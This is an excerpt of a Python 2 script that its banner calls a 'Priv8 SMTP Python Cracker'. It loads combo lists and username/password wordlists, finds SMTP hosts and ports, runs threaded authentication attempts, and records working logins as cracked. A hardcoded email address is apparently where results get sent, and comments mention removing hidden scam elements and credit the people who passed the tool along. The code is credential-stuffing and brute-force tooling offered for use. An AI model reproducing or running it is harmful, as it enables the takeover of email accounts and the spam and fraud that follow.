...
#idk who's the coder but thnx and thnx for rayenAlpino Who give me this shit <3
#[!] by Escaonor : bug fixer ;) (& deleting some hide-elements to scamming )
try:
	import Queue
except:
	try:#some Termux's users vent queueModule in py2
...
class consumer(threading.Thread):
	...
	def findHost(self,host):
		...
		try:
			...
			pass
		print g+' [*] Searching smtp host and port on '+w+host
		cache[host]=[-1,-1]
		for i,p in enumerate(self.ports):
			for j,h in enumerate(self.hosts):

				try:
					print g+' [*] Trying connection on '+w+h+host+':'+str(p)
	...
	def connect(self,tupple,ssl=False):
		...
		print g+'[+] Trying '+w+host+":"+port+" "+user+" "+passw
		try:
			...
			if rez[0:3]!="235" or 'fail' in rez:
				...
				s.close()
				return 0
			print y+'[>] BomB '+host+':'+port+' '+user+' '+passw
...
try:
 tld=open('tlds.txt','r').read().splitlines()
	...
	sys.exit(r+"{!} tlds.txt not Founded"+w)
tlds=cache={}
bads=[]
cracked=[]
rbads=0
#to
email='tsuminor@gmail.com' #taruh emailmu ,biar sendinbox ke mailmu!
try:
 #usage python crack.py List.txt <threads:100> <num type>
 ...
 inputs=open(raw_input('%s[%sCombo%s]%s '%(b,g,b,w)),'r').read().splitlines()
 thret=raw_input("%s[%sThreads(Max:200)%s]%s "%(b,g,b,w))#dont change this
 if int(thret)>200:
	thret=200
 print """ {y}[{r}!{y}] Priv8 SMTP Python Cracker (bug fixed!)\n Recoder Mail : {em} \n Choice:
 ## {y}Bruting
 {b}[{g}1{b}] {y}Combo(user:pass)
 ## {y}Checking
 {b}[{g}2{b}] {y}Combo(Email:pass)
 {b}[{g}3{b}] {y}mNormal (just do it -_-)
 {b}[{r}!{b}] {y}Im Escanor And This Tool is Part For Darks!de project please contact Me
 {b}[{g}/{b}] {y}{y}Facebook_ID > Eric Pedra""".format(em=email,r=r,y=y,g=g,b=b)
 option=raw_input('%sn0r%s>%s'%(w,r,w))
if len(option)>4:
	rbads=1
...
for i in range(int(thret)):
	try:
		...
		print r+"{!} Working only with %s threads"%i+w
		break
if option=='0':
	pass
elif option=='2':
	for i in inputs:
 	...
 	try:
		users=open('usr.txt','r').read().splitlines()
		print y+"{!} usr.txt Founded "+w
	except Exception,e:
		sys.exit(r+"{!} usr.txt Not Founded  "+w)
 	try:
		passwords=open('pwd.txt','r').read().splitlines()
		print y+"{!} pwd.txt Founded "+w
	except Exception,e:
		sys.exit(r+"{!} pwd.txt Not Founded  "+w)
	for p in passwords:
		for u in users:
			for i in inputs:
				#t=tld2(i)
